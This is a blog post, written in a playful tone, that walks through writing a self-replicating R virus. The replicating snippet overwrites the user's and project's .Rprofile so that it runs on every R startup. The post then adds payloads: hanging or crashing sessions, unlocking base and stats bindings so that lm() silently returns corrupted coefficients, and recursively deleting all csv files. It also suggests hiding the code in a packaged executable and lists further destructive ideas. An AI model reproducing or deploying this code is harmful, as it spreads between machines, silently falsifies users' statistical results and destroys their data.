---
title: 'Write an R Virus '
author: Siqi Zhang
date: '2018-09-27'
slug: how-to-write-an-r-virus
categories:
  - R
tags:
  - Programming
---

A [computer virus](https://en.wikipedia.org/wiki/Computer_virus) is a piece of program that can:

 - copy itself
 - do bad things     

This is not very hard to accomplish with R, as I will demonstrate in this article.  

  
## Replicate ##
    
The [_virus_](https://gist.github.com/iqis/e4030f6af45d0d3ebae21f2816c1fc58) exploits R's initilization script, `.Rprofile`. When R starts up, it is going to look for this file in the current working directory and the user's home directory, then runs everything in it:
```{r, eval = FALSE}
{
    function() {
        rp_paths <- c("~/.Rprofile", paste0(getwd(), "/.Rprofile"))
        inject <- function(rp, code) {
            write(code, file = rp, append = FALSE)
        }
        lapply(rp_paths, inject, code = deparse(match.call()))

        cat("Wow, your R is Rancid!!!\n")
    }
}()

```

When the above script is run, it will make a copy of itself through `deparse(match.call())`, and overwrite the `.Rprofile` files. The next time you open a new R session, everything you see in the above will be run again. Right now, our virus does nothing but printing something at the end of your start up message.

```
...

Type 'demo()' for some demos, 'help()' for on-line help, or
'help.start()' for an HTML browser interface to help.
Type 'q()' to quit R.

Wow, your R is Rancid!!!
```
Any project that started by the user is going to have its project folder infected. Likewise, if someone copy-and-pasted the R project folder to another computer, and start R from there, his home folder is going to be infected.

As R is an interpreted language, this seems to be the only way to infection. To conceal our malicous code, there is a way of packing a Shiny app into a Windows executable through using a tool called [RInno](https://ficonsulting.github.io/RInno/), which has [Electron](https://electronjs.org/) behind itself.
  
## Damage ##
    
It looks like that the replication part of the virus is taken care of. What, then, are some malicious scripts that we can have fun with? 

There could be countless ways.

One of the easiest thing to do is to hang the user's R session. It could be done as simply as putting it to _sleep_ for a really long time:
```{r, eval = FALSE}
Sys.sleep(1e9)
```
... like 30 years, give or take.

Or, let R come up with a really large number; this is also going take up available memory to the user.
```{r, eval = FALSE}
rnorm(1e9)
```
For me, 1e9 is quite enough. But scientific notaion is your friend. Go big.

However, if R is rendered completely unusable, the virus isn't goint to travel very far. That's not what we want. It is also a great idea to replace some good functions with naughty ones. Symbol bindings are locked in attached namespaces, but it is easy to undo that:
```{r}
reassign <- function(sym, value, envir) {
        envir <- as.environment(envir)
        unlockBinding(sym, envir)
        assign(sym, value, envir = envir)
}
```

We can do the user a service by forbidding the `library()` function, and prompt a better option.
```{r}
reassign("library", 
         function(...) warning("No man, seriously. Use require()"),
         "package:base"
)
```

The effect would be:
```{r}
library(purrr)
```

Now let's try something more subtle and more bad(_badder_?). We first extend the `reassign()` function a little bit...
```{r}
tamper <- function(sym, value, envir){
        assign(paste0(".",sym), 
               get(sym, envir = as.environment(envir)), 
               envir = as.environment("package:base")
               )
        reassign(sym, value, envir)
}
```

... and use it to slip in some bad code.
```{r}
tamper("lm",
       function(...){
               model <- .lm(...)
               model$coefficients <- 
                       model$coefficients * (1 + rnorm(1))
               model
               },
       "package:stats")
```

Now when we build a model; the coefficients looks normal, but are completely off. You can compare the this with the result on your own computer.
```{r}
lm(mpg ~ ., data = mtcars)$coefficients
```

In the above, we saved a copy of the original function in the base package, concealing it with prepending the name wit a `.`. If we didn't do that, we would have create an infinite recursion through self-refernce, such as:
```{r, eval = FALSE}
reassign("paste",
         function(...) paste(...),
         "package:base")

```

```{r, eval = FALSE}
paste("foo", "bar")
```
Running this will have an effect of crashing the R session. If the user didn't save documents before setting off this bomb,it's obviously too bad. Another way to create trouble.

## Further Damage ##
    
There are yet more ways to our streak of mischief. For starters, how about deleting every `csv` file the user has in the working directory? 
```{r eval = FALSE}
file.remove(list.files(getwd(), 
                       ".csv",
                       recursive = TRUE)
```
    
Doing something on the file system is a big step foward form just messing with their R session.

From annoying to destructive, the level of naughtiness only limited by on your imagination. With some deliberation, you can ruin someone's life in a very meaningful way. 

Here are some futher ideas:

  -  Bloat the user's disk space with meaningless data
  -  Give wrong results only _sometimes_ when a function is called
  -  Use [Rstudio API](https://rstudio.github.io/rstudio-extensions/pkgdown/rstudioapi/index.html) to mess with the user's scripts in the editor, or some other wild sh*t.

    
    
**Note**  
You also have the choice of putting any of the malicious programs in `.First()` and `.Last()` functions, which will run at the beginning and the end of a session. See the [R Manual](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html) for details. 

More on `.Rprofile`: [Fun with .Rprofile and customizing R startup](http://www.onthelambda.com/2014/09/17/fun-with-rprofile-and-customizing-r-startup/)
